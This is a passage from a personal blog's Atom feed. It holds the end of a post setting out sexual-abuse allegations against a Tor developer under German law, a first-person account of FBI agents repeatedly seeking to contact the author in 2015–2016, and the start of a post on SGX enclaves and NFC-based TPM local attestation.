corresponding minimum/maximum prison&amp;nbsp;terms:&lt;/p&gt;
&lt;p&gt;&lt;a href="http://jacobappelbaum.net/#portfolioModal3"&gt;Forest&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;One count of rape
   (&lt;a href="https://www.gesetze-im-internet.de/stgb/__177.html"&gt;§177 of the Strafsgesetzbuch&lt;/a&gt;
   paragraph 1) for a person in an unconscious state or otherwise incapable
   of verbal disagreement or resistance
   (&lt;a href="https://www.gesetze-im-internet.de/stgb/__179.html"&gt;§179 of the Strafsgesetz&lt;/a&gt;):
   minimum, one year; maximum, ten&amp;nbsp;years.&lt;/li&gt;
&lt;li&gt;One
   &lt;a href="https://www.gesetze-im-internet.de/stgb/__253.html"&gt;count of blackmail&lt;/a&gt;:
   minimum, none; maximum: five&amp;nbsp;years.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a href="http://jacobappelbaum.net/#portfolioModal2"&gt;River&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;One count of rape
   (&lt;a href="https://www.gesetze-im-internet.de/stgb/__177.html"&gt;§177 of the Strafsgesetzbuch&lt;/a&gt;
   paragraph 1),&amp;nbsp;including&lt;/li&gt;
&lt;li&gt;Instructing a third party to rape the victim
   (&lt;a href="https://www.gesetze-im-internet.de/stgb/__177.html"&gt;§177 of the Strafsgesetzbuch&lt;/a&gt;
   paragraph 2, sentence 2), making it a &amp;#8220;severe&amp;nbsp;case&amp;#8221;,&lt;/li&gt;
&lt;li&gt;Both counts were penetrative intercourse
   (&lt;a href="https://www.gesetze-im-internet.de/stgb/__177.html"&gt;§177 of the Strafsgesetzbuch&lt;/a&gt;
   paragraph 2, sentence 1), also making it a &amp;#8220;severe&amp;nbsp;case&amp;#8221;,&lt;/li&gt;
&lt;li&gt;The victim was additionally in an unconscious state and uncapable
   of verbal or physical resistance
   (&lt;a href="https://www.gesetze-im-internet.de/stgb/__179.html"&gt;§179 of the Strafsgesetz&lt;/a&gt;,
   including paragraph 5, as well as paragraph 5 sentence 2):
   minimum: two years; maximum: ten&amp;nbsp;years.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a href="http://jacobappelbaum.net/#portfolioModal1"&gt;Sam&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Sexual assault (&lt;a href="https://www.gesetze-im-internet.de/stgb/__177.html"&gt;§177 of the Strafsgesetzbuch&lt;/a&gt;
   paragraph 1): minimum, one year; maximum: ten&amp;nbsp;years.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Totalling to four years minimum and thirty-five years maximum for those cases
alone, along with potential fines and reparations, and expulsion from the
country afterwards
(cf. &lt;a href="https://www.gesetze-im-internet.de/aufenthg_2004/__53.html"&gt;§53 and §54 of the Aufenthaltsgesetz&lt;/a&gt;).
(For English speakers curious about the German laws I&amp;#8217;m referencing, there are
also
&lt;a href="https://www.gesetze-im-internet.de/englisch_stgb/index.html"&gt;official English translations&lt;/a&gt;.)&lt;/p&gt;
&lt;p&gt;Not to mention that, if our goal is to prevent more people from being harmed by
Jake, prison is not an option.  Overwhelmingly likely,
&lt;a href="http://www.zeit.de/2012/34/DOS-Gefaengnisse-Deutschland-Gewalt"&gt;even in Germany&lt;/a&gt;,
Jake would be raped in prison.  I do not wish these painful things I&amp;#8217;ve gone
through on anyone, not even those who have caused me pain.  Further,
&lt;a href="http://www.bjs.gov/content/pub/pdf/parip.pdf"&gt;most abusers have a history of having been abused at some point in their past&lt;/a&gt;,
and Jake going to prison certainly will not help him amend his&amp;nbsp;behaviour.&lt;/p&gt;
&lt;h3&gt;Alternatives&lt;/h3&gt;
&lt;p&gt;Some people are asking what the victims want out of&amp;nbsp;this.&lt;/p&gt;
&lt;p&gt;Personally, I would be completely ecstatic if Jake decided to move to Alaska.
Forever.  Jake is &lt;em&gt;still threatening the other victims&lt;/em&gt; to try to keep them
quiet, and additional reports of extremely severe sexual assaults and rape are
pouring in to The Tor Project.  Meanwhile, Jake is preparing some sort of public
&amp;#8220;apology&amp;#8221; statement.  Alaska, or northern Siberia — it doesn&amp;#8217;t matter.  Until
his sociopathic behaviours are revised, there is no place for him in civil&amp;nbsp;society.&lt;/p&gt;
&lt;p&gt;As it is obviously rather untenable that Jake move to Alaska, I suggest the
following.  Please note that these are my suggestions alone, and do not
necessarily at this point in time reflect those of all of the other victims.
We&amp;#8217;re all still processing&amp;nbsp;this.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;We need to entirely remove abusers from our communities, until such a time as
   they have sufficiently demonstrated &lt;em&gt;to their victims&lt;/em&gt; that their abusive
   behaviours will no longer continue.  Jake should be removed from all places
   where his victims, their loved ones, and friends might come into any form of
   contact with him.  Given the enormous amounts of pain myself and the other
   victims have gone through, the draining emotional stress, and (please excuse
   my rather dark humour) the development time wasted, &lt;strong&gt;I am not willing to
   revisit this issue for at least four years&lt;/strong&gt;.  After that time has passed, it
   &lt;em&gt;may&lt;/em&gt; be possible to reassess whether there is any path forward for&amp;nbsp;Jake.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;We need to assess the cultural issues within our communities which require
   that victims report anonymously, due to fears of retaliation, further
   abuse, and not being taken seriously.  Once identified, we need to devise
   better reporting and support structures to help allay these&amp;nbsp;fears.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;We need to take victims&amp;#8217; stories seriously.  It should not be required that
   victims band together in collectives in order to be heard.  Nor should it be
   required that someone who stands up for others must have and share their
   own story of victimisation to &amp;#8220;prove&amp;#8221; the credibility of the others, as was
   my case.  It should not be required that a dozen people are harmed before
   any one of them is taken&amp;nbsp;seriously.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;We need to critique the institutions — sociocultural, academic, and
   organisational — which made these events&amp;nbsp;possible.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Those who must still have some form of contact with Jake, and by that I
   primarily mean others within the academic and journalistic communities, need
   to be given ways to raise safety and ethical concerns without fear of
   retribution or retaliation.  It is my understanding that several researchers
   and students do not currently feel this way, and that this is having a severe
   impact upon their abilities to be successful and&amp;nbsp;productive.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Lastly, I would like to say that I&amp;#8217;ve never been prouder to work for The Tor
Project, as their recent actions to stand against abuse have set nothing short
of an exemplary model for other&amp;nbsp;organisations.&lt;/p&gt;</content><category term="anarchism"></category><category term="harassment"></category></entry><entry><title>FBI Harassment</title><link href="https://blog.patternsinthevoid.net/fbi-harassment.html" rel="alternate"></link><published>2016-05-01T05:29:00+00:00</published><updated>2016-05-04T18:55:00+00:00</updated><author><name>isis agora lovecruft</name></author><id>tag:blog.patternsinthevoid.net,2016-05-01:/fbi-harassment.html</id><summary type="html">&lt;!-- Original headers: --&gt;

&lt;!-- Date: 2015-12-08 05:29 --&gt;

&lt;!-- Slug: 815df063fdbdd7697805b1a3622eaa22a2b4ca19e25f588d993bf121c67d13c9--&gt;



&lt;p&gt;&lt;i&gt;&lt;b&gt;Obligatory Disclaimer:&lt;/b&gt; Personal or political views presented within
this post absolutely do not reflect those of my employer(s), client(s), and/or
legal&amp;nbsp;counsel.&lt;/i&gt;&lt;/p&gt;
&lt;p&gt;In the final week of November 2015, a Special Agent from the Federal Bureau of
Investigation, Mr. Mark Burnett, knocked on the door of my family&amp;#8217;s home and
left his card, with an additional phone number penciled in.  All my family
members residing in America had planned a week-long vacation and were all on a
remote island.  When the &lt;span class="caps"&gt;FBI&lt;/span&gt; receives &lt;span class="caps"&gt;DHS&lt;/span&gt; flight records as if they&amp;#8217;re the
morning paper, I must admit that whatever reasons for why the Bureau didn&amp;#8217;t
know that I or my family were absent escape me&amp;nbsp;entirely.&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;&lt;span style="align:left; float:left; width:100%;"&gt;
  &lt;table style="float:left; clear:left; width:100%; margin: 1px;"&gt;
    &lt;tbody&gt;
      &lt;tr&gt;
        &lt;td style="text-align:center; padding: 1px;"&gt;
          &lt;a href="/static/images/2015/12/card.jpeg"&gt;
            &lt;img alt="The card of special agent Mark Burnett" style="width: 700px;"
                 src="/static/images/2015/12/card.jpeg" /&gt;
          &lt;/a&gt;
        &lt;/td&gt;
      &lt;/tr&gt;
    &lt;/tbody&gt;
  &lt;/table&gt;
&lt;/span&gt;
&lt;/p&gt;&lt;br /&gt;&lt;p&gt;&lt;/p&gt;


&lt;p&gt;My mom found the above card of Agent Burnett, face down on the marble entryway
of the house, some days after returning home from vacation.  As credit to her
and my dad, and, the sheer chaos of every member of our family (including my
sibling) being hackers/programmers, at first they didn&amp;#8217;t assume the card had
anything to do with me.  After all, I don&amp;#8217;t live in America anymore, and also
anyone who knows me in the slightest is well aware that I&amp;#8217;m so horribly busy
with work… such that for several years I&amp;#8217;ve often ignored, stood up, and let
down my closest friends.  My mother assumed that, if it were really important,
the agent would call her.  He did, while she was at work a couple days later.
(As an aside: that any random &lt;span class="caps"&gt;FBI&lt;/span&gt; agent has the ability to learn someone&amp;#8217;s
personal cell phone number and use it — uninvited — is, in my opinion,
extremely threatening and unacceptable.)  He didn&amp;#8217;t say what he wanted, only
that he wanted to know how to contact her daughter.  I was travelling (as
always), and my mother didn&amp;#8217;t have a phone number for&amp;nbsp;me.&lt;/p&gt;
&lt;p&gt;I had already been in the process of moving, permanently, to Germany, and had
retained a German immigrations lawyer several months prior to these events.
In late November, not knowing this had already been taking place, I returned
to the &lt;span class="caps"&gt;US&lt;/span&gt; for two weeks to visit family and friends for the holidays, collect
my remaining belongings, and make any needed long-term&amp;nbsp;arrangements.&lt;/p&gt;
&lt;p&gt;Word got to my lawyer in the &lt;span class="caps"&gt;US&lt;/span&gt;, who decided to call &lt;span class="caps"&gt;FBI&lt;/span&gt; Special Agent Mark
Burnett, on that Friday, saying that he represented me and my family.  Burnett
said the &lt;span class="caps"&gt;FBI&lt;/span&gt; simply wanted to ask me some questions.  My lawyer responded by
stating that, as my invoked representation, all questions should be directed
to him rather than to me or my family.  The agent agreed, paused while some
muffled male voices were heard in the background, and asked to call back in
five&amp;nbsp;minutes.&lt;/p&gt;
&lt;p&gt;Five minutes later, Burnett called back and said, &lt;em&gt;&amp;#8220;I don&amp;#8217;t believe you
actually represent her.&amp;#8221;&lt;/em&gt;¹  Burnett stated additionally that a phone call from
me might suffice, but that the &lt;span class="caps"&gt;FBI&lt;/span&gt; preferred to meet …&lt;/p&gt;</summary><content type="html">&lt;!-- Original headers: --&gt;

&lt;!-- Date: 2015-12-08 05:29 --&gt;

&lt;!-- Slug: 815df063fdbdd7697805b1a3622eaa22a2b4ca19e25f588d993bf121c67d13c9--&gt;



&lt;p&gt;&lt;i&gt;&lt;b&gt;Obligatory Disclaimer:&lt;/b&gt; Personal or political views presented within
this post absolutely do not reflect those of my employer(s), client(s), and/or
legal&amp;nbsp;counsel.&lt;/i&gt;&lt;/p&gt;
&lt;p&gt;In the final week of November 2015, a Special Agent from the Federal Bureau of
Investigation, Mr. Mark Burnett, knocked on the door of my family&amp;#8217;s home and
left his card, with an additional phone number penciled in.  All my family
members residing in America had planned a week-long vacation and were all on a
remote island.  When the &lt;span class="caps"&gt;FBI&lt;/span&gt; receives &lt;span class="caps"&gt;DHS&lt;/span&gt; flight records as if they&amp;#8217;re the
morning paper, I must admit that whatever reasons for why the Bureau didn&amp;#8217;t
know that I or my family were absent escape me&amp;nbsp;entirely.&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;&lt;span style="align:left; float:left; width:100%;"&gt;
  &lt;table style="float:left; clear:left; width:100%; margin: 1px;"&gt;
    &lt;tbody&gt;
      &lt;tr&gt;
        &lt;td style="text-align:center; padding: 1px;"&gt;
          &lt;a href="/static/images/2015/12/card.jpeg"&gt;
            &lt;img alt="The card of special agent Mark Burnett" style="width: 700px;"
                 src="/static/images/2015/12/card.jpeg" /&gt;
          &lt;/a&gt;
        &lt;/td&gt;
      &lt;/tr&gt;
    &lt;/tbody&gt;
  &lt;/table&gt;
&lt;/span&gt;
&lt;/p&gt;&lt;br /&gt;&lt;p&gt;&lt;/p&gt;


&lt;p&gt;My mom found the above card of Agent Burnett, face down on the marble entryway
of the house, some days after returning home from vacation.  As credit to her
and my dad, and, the sheer chaos of every member of our family (including my
sibling) being hackers/programmers, at first they didn&amp;#8217;t assume the card had
anything to do with me.  After all, I don&amp;#8217;t live in America anymore, and also
anyone who knows me in the slightest is well aware that I&amp;#8217;m so horribly busy
with work… such that for several years I&amp;#8217;ve often ignored, stood up, and let
down my closest friends.  My mother assumed that, if it were really important,
the agent would call her.  He did, while she was at work a couple days later.
(As an aside: that any random &lt;span class="caps"&gt;FBI&lt;/span&gt; agent has the ability to learn someone&amp;#8217;s
personal cell phone number and use it — uninvited — is, in my opinion,
extremely threatening and unacceptable.)  He didn&amp;#8217;t say what he wanted, only
that he wanted to know how to contact her daughter.  I was travelling (as
always), and my mother didn&amp;#8217;t have a phone number for&amp;nbsp;me.&lt;/p&gt;
&lt;p&gt;I had already been in the process of moving, permanently, to Germany, and had
retained a German immigrations lawyer several months prior to these events.
In late November, not knowing this had already been taking place, I returned
to the &lt;span class="caps"&gt;US&lt;/span&gt; for two weeks to visit family and friends for the holidays, collect
my remaining belongings, and make any needed long-term&amp;nbsp;arrangements.&lt;/p&gt;
&lt;p&gt;Word got to my lawyer in the &lt;span class="caps"&gt;US&lt;/span&gt;, who decided to call &lt;span class="caps"&gt;FBI&lt;/span&gt; Special Agent Mark
Burnett, on that Friday, saying that he represented me and my family.  Burnett
said the &lt;span class="caps"&gt;FBI&lt;/span&gt; simply wanted to ask me some questions.  My lawyer responded by
stating that, as my invoked representation, all questions should be directed
to him rather than to me or my family.  The agent agreed, paused while some
muffled male voices were heard in the background, and asked to call back in
five&amp;nbsp;minutes.&lt;/p&gt;
&lt;p&gt;Five minutes later, Burnett called back and said, &lt;em&gt;&amp;#8220;I don&amp;#8217;t believe you
actually represent her.&amp;#8221;&lt;/em&gt;¹  Burnett stated additionally that a phone call from
me might suffice, but that the &lt;span class="caps"&gt;FBI&lt;/span&gt; preferred to meet with me in person.  After
a pause he said, &lt;em&gt;&amp;#8220;But… if we happen to run into her on the street, we&amp;#8217;re
gonna be asking her some questions without you&amp;nbsp;present.&amp;#8221;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;My lawyer and I discussed what the &lt;span class="caps"&gt;FBI&lt;/span&gt; could possibly want.  Theories ranged
from attempted entrapment, to the recent and &lt;em&gt;completely unethical&lt;/em&gt; Carnegie
Mellon University (&lt;span class="caps"&gt;CMU&lt;/span&gt;) attacks on the live Tor network, to a Grand Jury
subpoena for someone else, to some shady request for a backdoor in some
software I contribute to.  We honestly could not come up with any coherent
rationale for why the &lt;span class="caps"&gt;FBI&lt;/span&gt; would suddenly decide to come after me, as, to my
knowledge, I have done nothing which should warrant any interest besides my
contributions to open source encryption&amp;nbsp;tools.&lt;/p&gt;
&lt;p&gt;In the case that they might have asked for a backdoor, I tried to distract
myself from the overwhelming (I don&amp;#8217;t think I&amp;#8217;ve actually fully understood the
word &amp;#8220;overwhelming&amp;#8221; before these events)&amp;nbsp;stress.&lt;/p&gt;
&lt;p&gt;I still planned to continue moving, of course, but now things would need to go
to different places, and by different means.  I didn&amp;#8217;t know if I&amp;#8217;d be stopped
at the &lt;span class="caps"&gt;US&lt;/span&gt; border, or even prevented entirely from leaving.  I started having
panic attacks, thinking that I&amp;#8217;d need to get myself and &lt;em&gt;literally&lt;/em&gt; every
object, including electronics, that I cared about accross the border, knowing
they&amp;#8217;d have the ability to detain me and mess with my belongings for as long
as they liked.  Every device I owned could be compromised, I&amp;#8217;d lose all my
data, my pictures of family and loved ones, fiction I&amp;#8217;d wrote as a teenager,
and Lisp I&amp;#8217;d wrote as a child.  I&amp;#8217;ll admit I actually cried, not knowing when
I&amp;#8217;d hug my mom again.  I prepared myself mentally, trying to model every
possible tactic the &lt;span class="caps"&gt;FBI&lt;/span&gt; could play and my planned&amp;nbsp;response.&lt;/p&gt;
&lt;p&gt;If they ask for information on anyone else, or think I witnessed or committed
some crime: I solemnly invoke my Miranda rights.  No joking.  No snark.  No
fucking around.
&lt;a href="https://www.youtube.com/watch?v=d-7o9xYp7eE"&gt;Everyone knows you don&amp;#8217;t talk to the police&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;If they want a backdoor, or some other extralegal information about users or
systems, likewise: I&amp;#8217;d ask for my lawyers and shut&amp;nbsp;up.&lt;/p&gt;
&lt;p&gt;I didn&amp;#8217;t talk to anyone who wasn&amp;#8217;t already in regular contact with me, fearing
I might endanger them — some thug might show up at their mom&amp;#8217;s door or make
some threats to their lawyers — and I didn&amp;#8217;t want to risk harming people I
care about.  It hurt to not tell my friends what was happening.  I felt gagged
and frightened.  I wanted to play chess in the park.  I wanted to learn duets
on the piano.  I wanted to ride bicycles through the ancient groves in the
park in the endless Californian sunshine.  I wanted to bring homemade vegan
gluten-free brownies and stickers from collectives in France to my friends at
the &lt;span class="caps"&gt;EFF&lt;/span&gt;.  To be selfish, I wanted to read the number theory papers I&amp;#8217;d just
downloaded and play with a new pairing-based cryptography library I&amp;#8217;d just
been given the source to, but I couldn&amp;#8217;t do those things either, simply
because I was too stressed out to think&amp;nbsp;straight.&lt;/p&gt;
&lt;p&gt;I got absolutely no work&amp;nbsp;done.²&lt;/p&gt;
&lt;p&gt;If you&amp;#8217;re going to get arrested, you might as well look good and smile your
brightest while doing so.  In a blur of anxiety and self-consciousness, I
bought a pair of blue-green aviators and matching blue-green lipstick.  &lt;em&gt;This
will totally build rapport with my interlocutors,&lt;/em&gt; I told myself.  They will
have no alternative but to understand that I fight for the good guys, that
they should immediately drop their badges and guns — but keep the aviators! —
to join me to fight for the true cause and&amp;nbsp;freedom!&lt;/p&gt;
&lt;p&gt;Due to speak at several cryptographic conferences in Europe, I flew from San
Francisco&amp;#8217;s internation airport to Brussels on the next Monday evening, on the
latest flight I could get.  I had been advised by another lawyer that, &amp;#8220;For
the &lt;span class="caps"&gt;FBI&lt;/span&gt;, &amp;#8216;quitting time&amp;#8217; means quitting.  After 5 o&amp;#8217;clock, you&amp;#8217;re good; you
can do whatever you want, party in the streets naked on &lt;span class="caps"&gt;LSD&lt;/span&gt;, and they won&amp;#8217;t
notice a thing.&amp;#8221;  I also booked a return flight (though I had no intention of
using it, since I planned to live in Germany) upon the advice of multiple
lawyers.  With printed out conference and speaking invites, blue-green
aviators, and blue-green lipstick, I went to San Francisco International
Airport expecting to be detained indefinitely and lose everything I cared&amp;nbsp;about.&lt;/p&gt;
&lt;p&gt;Nothing&amp;nbsp;happened.&lt;/p&gt;
&lt;p&gt;I don&amp;#8217;t understand this.  The &lt;span class="caps"&gt;FBI&lt;/span&gt; is handed &lt;span class="caps"&gt;DHS&lt;/span&gt; flight records like they&amp;#8217;re
the morning edition.  They should have known, when they knocked on my parents&amp;#8217;
door, that no one would be home.  They should have known when I would fly into
San Francisco, and they could have easily detained me then.  They reasonably
could have known, and potentially acted fast enough, to detain me when I left
San Francisco for&amp;nbsp;Brussels.&lt;/p&gt;
&lt;p&gt;Once in Germany, I proceeded to compile &amp;#8220;The Book&amp;#8221; of documents necessary for
obtaining an Aufenthaltserlaubnis (roughly translated, &amp;#8220;residence visa with
permission to work certain jobs, e.g. as a contractor/freelancer&amp;#8221;).  My
appointment was in early January.  The day before my appointment, I spoke with
my lawyer.  He had received another call, this time from a &lt;span class="caps"&gt;FBI&lt;/span&gt; Special Agent
Kelvin Porter in&amp;nbsp;Atlanta.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Lawyer:&amp;nbsp;Hello?&lt;/p&gt;
&lt;p&gt;Agent: Hello, this is Special Agent Kelvin Porter at the &lt;span class="caps"&gt;FBI&lt;/span&gt; field
       offices in Atlanta.  I&amp;#8217;m calling concerning your&amp;nbsp;client.&lt;/p&gt;
&lt;p&gt;Lawyer: Yes.  Why are you trying to contact&amp;nbsp;her?&lt;/p&gt;
&lt;p&gt;Agent: Well… as before… we would strongly prefer to meet her in person.  We
       have teams in Los Angeles, San Francisco, Chicago, New York, and
       Atlanta keeping an eye out for&amp;nbsp;her.&lt;/p&gt;
&lt;p&gt;Lawyer: Your colleague mentioned last time that you would accept a phone&amp;nbsp;call?&lt;/p&gt;
&lt;p&gt;Agent: We would strongly prefer to meet her in person.  We… uh… have some
       documents we&amp;#8217;d like her opinion&amp;nbsp;on.&lt;/p&gt;
&lt;p&gt;Lawyer: Umm…?  What&amp;nbsp;documents?&lt;/p&gt;
&lt;p&gt;Agent: Anyway, if she&amp;#8217;s available to meet with us, that would be great,&amp;nbsp;thanks.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;It didn&amp;#8217;t &lt;em&gt;exactly&lt;/em&gt; help with the stress of applying for a residence visa to
know that there were teams in five cities across America keeping an eye out
for me.  However, I&amp;#8217;m glad to say that, the next day, my residence visa was
approved.  Eight hours afterwards, my laywer received a voicemail&amp;nbsp;saying:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Agent: Hello this is Special Agent Kelvin Porter, we spoke two days ago
       regarding your client.  Umm… well… so the situation with the
       documents… it&amp;#8217;s umm… it&amp;#8217;s all fixed.  I mean, we would of course
       still be happy to meet with your client if she&amp;#8217;s willing, but the
       problem has… uh… yeah… been fixed.  And uh… yeah.  Just let us know
       if she wants to set up a&amp;nbsp;meeting.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Admittedly, I can&amp;#8217;t even begin to understand what was going on here.
Documents?  Was this attempted entrapment?  Or were they using this as bait to
get me interested in meeting them, so that they could ask about something
else?  I mean, help me, please — I really don&amp;#8217;t understand what the &lt;span class="caps"&gt;FBI&lt;/span&gt;&amp;#8217;s
strategy was&amp;nbsp;here.&lt;/p&gt;
&lt;p&gt;Or, are they retracting their previous position in order to entice me to
return to the &lt;span class="caps"&gt;US&lt;/span&gt;?  Should I be worried about what happens to me when I return?
Why is the &lt;span class="caps"&gt;FBI&lt;/span&gt; trying to make a developer of an open source encryption tool
feel unwelcome in their country of origin?  Should I try to get a different
citizenship?  Is my family safe in the &lt;span class="caps"&gt;US&lt;/span&gt;?  Should I worry about the &lt;span class="caps"&gt;FBI&lt;/span&gt;
raiding my parents&amp;#8217; house and shooting our family dog?  Should I worry about
&lt;span class="caps"&gt;FBI&lt;/span&gt; agents stalking and harrassing my mother?  Is this really how the United
States has decided to treat American tech workers?  Am I just the forerunner
in a larger campaign by the &lt;span class="caps"&gt;FBI&lt;/span&gt; to personally go after developers of
encryption software which annoys&amp;nbsp;them?&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;Update:&lt;/strong&gt;&amp;nbsp;2016-04-26&lt;/p&gt;
&lt;p&gt;The &lt;span class="caps"&gt;FBI&lt;/span&gt; has contacted my lawyer again.  This time, they said, &amp;#8220;She should meet
with one of our agents in San Francisco to talk.  Otherwise, are you the point
of contact for serving a subpoena?  She&amp;#8217;s not the target of investigation,
but, uh… we uh… need her to clear up her involvement or… uh… &lt;em&gt;potential&lt;/em&gt;
involvement in a&amp;nbsp;matter.&amp;#8221;&lt;/p&gt;
&lt;p&gt;In case the &lt;span class="caps"&gt;FBI&lt;/span&gt; is seeking data on Tor users or Tor bridges, and especially in
case the subpoena turns out to be sealed or accompanied by an &lt;span class="caps"&gt;NSL&lt;/span&gt;: the
original published contents of this post are archived as a &lt;span class="caps"&gt;PDF&lt;/span&gt;
&lt;a href="https://fyb.patternsinthevoid.net/blog.patterns-in-the-void-2016-04-30.pdf"&gt;here&lt;/a&gt;, and the
&lt;span class="caps"&gt;RIPE160&lt;/span&gt;(&lt;span class="caps"&gt;SHA256&lt;/span&gt;(&lt;span class="caps"&gt;PDF&lt;/span&gt;)) is equal to 5541405e08048658cf457b3c59bf42a51f84a1a3 and
hence
&lt;a href="https://blockchain.info/address/18mnc4BCud3vjAdLbCc3QhyrjN84VTT1iM"&gt;Bitcoin address 18mnc4BCud3vjAdLbCc3QhyrjN84VTT1iM&lt;/a&gt;,
in order to prove in a cryptographically verifiable manner that I published
before that point in&amp;nbsp;time.&lt;/p&gt;
&lt;p&gt;For over a year, I have maintained
&lt;a href="https://fyb.patternsinthevoid.net/canary.html"&gt;a warrant canary&lt;/a&gt; which covers
the case of law enforcement agencies serving me a subpoena for information
about Tor users or Tor&amp;nbsp;bridges.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;¹ My lawyer mentioned a legal technicality (which may or may not be &lt;em&gt;actually&lt;/em&gt;
legal because precedent is unclear): having a prior retainer to a defense
lawyer in the United States does &lt;em&gt;not&lt;/em&gt; mean that a lawyer can invoke the
client&amp;#8217;s Miranda Rights (i.e. the right to remain silent) &lt;em&gt;for&lt;/em&gt; the client,
but that the client may be technically required to personally invoke their own
Miranda&amp;nbsp;Rights.&lt;/p&gt;
&lt;p&gt;² Dear &lt;span class="caps"&gt;FBI&lt;/span&gt;, for what it&amp;#8217;s worth: technically, financially-speaking, we&amp;#8217;re
funded by the same government.  You can view my current contract and pay
&lt;a href="http://people.torproject.org/~isis/otf-etfp-proposal.pdf"&gt;here&lt;/a&gt; and you can
subscribe to
&lt;a href="mailto:tor-dev-requests@lists.torproject.org?subject=subscribe"&gt;any&lt;/a&gt;
&lt;a href="OTF-Talk+subscribe@opentechfund.org"&gt;of&lt;/a&gt;
&lt;a href="OTF-Active+subscribe@opentechfund.org"&gt;several&lt;/a&gt; mailing lists in order to
track my development progress.  You can also
&lt;a href="https://gitweb.torproject.org/user/isis"&gt;watch&lt;/a&gt; &lt;a href="https://code.ciph.re/"&gt;my&lt;/a&gt;
&lt;a href="https://github.com/isislovecruft"&gt;commits&lt;/a&gt; in real time.  You can literally
see everything I do, who I work for, how much money I make, where I go, and
probably a whole bunch of other data about me.  I have an
&lt;a href="mailto:isis+acab@en.ciph.re"&gt;email address&lt;/a&gt; (and legal counsel).  Protip: do
your homework next&amp;nbsp;time.&lt;/p&gt;</content><category term="hacking"></category><category term="fbi"></category></entry><entry><title>Using Intel SGX Enclaves in NFC-enabled TPM-based Local Attestation</title><link href="https://blog.patternsinthevoid.net/sgx-nfc-tpm.html" rel="alternate"></link><published>2016-01-28T15:29:00+00:00</published><updated>2016-12-19T23:24:37+00:00</updated><author><name>isis agora lovecruft</name></author><id>tag:blog.patternsinthevoid.net,2016-01-28:/sgx-nfc-tpm.html</id><summary type="html">

&lt;p&gt;Previously, &lt;a href="https://twitter.com/mjg59"&gt;Matthew Garrett&lt;/a&gt; and I came up with an
new idea for a method of local attestation.  Local attestation here means:
&lt;em&gt;authenticating the computer that the user possesses a valid hardware token&lt;/em&gt;
and &lt;em&gt;authenticating to the user that the computer is executing the intended
code, and that said code has not been tampered with.&lt;/em&gt; The idea is to use some
&lt;span class="caps"&gt;NFC&lt;/span&gt;-enabled &amp;#8220;smart&amp;#8221; wearable device, something trivially hideable on (or
&lt;em&gt;inside&lt;/em&gt;¹) one&amp;#8217;s person in order to authenticate to the &lt;span class="caps"&gt;TPM&lt;/span&gt;, which then
validates that the next stage of code to be executed, e.g. usually the kernel
(ring 0) or the hypervisor (ring &amp;#8220;-1&amp;#8221;), has verifiable integrity.  Matthew has
&lt;a href="https://media.ccc.de/v/32c3-7343-beyond_anti_evil_maid"&gt;a great 32c3 talk&lt;/a&gt; on
&lt;span class="caps"&gt;TPM&lt;/span&gt;-based local attestation, and even breifly, towards the end of the video,
mentions the &lt;span class="caps"&gt;NFC&lt;/span&gt;&amp;nbsp;ideas.&lt;/p&gt;
&lt;p&gt;As an example use case, this would allow journalists² greater safety when
crossing borders.  Your laptop got taken away by the &lt;span class="caps"&gt;TLA&lt;/span&gt; at a border?  Not
such a problem; it simply doesn&amp;#8217;t boot without you present.  The &lt;span class="caps"&gt;TLA&lt;/span&gt; took your
laptop into the back room to try to install some malware on it?  No worries,
because your laptop will refuse to boot the next time you try to do so (or it
could signal in some other way that the system was compromised… however,
refusing to decrypt the user&amp;#8217;s harddrive is probably a bare minimum safety
requirement, and refusing to boot at all is probably the&amp;nbsp;safest).&lt;/p&gt;
&lt;p&gt;However, all of this places a great deal of trust in both the &lt;span class="caps"&gt;TPM&lt;/span&gt; device and
its&amp;nbsp;manufacturer…&lt;/p&gt;


&lt;p&gt;Despite &lt;a href="https://twitter.com/rootkovska"&gt;Joanna&lt;/a&gt; Rutkowska&amp;#8217;s
&lt;a href="http://theinvisiblethings.blogspot.ru/2013/08/thoughts-on-intels-upcoming-software.html"&gt;concerns over untrusted user input/output&lt;/a&gt;,
it would be interesting to see a system, built upon the above local
attestation method, which uses an
&lt;a href="https://software.intel.com/en-us/blogs/2013/09/26/protecting-application-secrets-with-intel-sgx"&gt;Intel &lt;span class="caps"&gt;SGX&lt;/span&gt; enclave&lt;/a&gt;
(see the
&lt;a href="https://software.intel.com/sites/default/files/managed/07/b7/319433-023.pdf#page=36"&gt;Intel Instruction Set Extensions Programming Reference&lt;/a&gt;
for architectural details) to execute code whose integrity has been previously
verified through two-factor authenticated &lt;span class="caps"&gt;TPM&lt;/span&gt; local attestation.  This doesn&amp;#8217;t
require user I/O, and it doesn&amp;#8217;t require anything to be displayed to the user.
What it would provide, however, is a way for the code whose integrity is
verified by the &lt;span class="caps"&gt;TPM&lt;/span&gt; to remain safely isolated&amp;nbsp;from:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;the &lt;span class="caps"&gt;BIOS&lt;/span&gt;, or tampering&amp;nbsp;thereof,&lt;/li&gt;
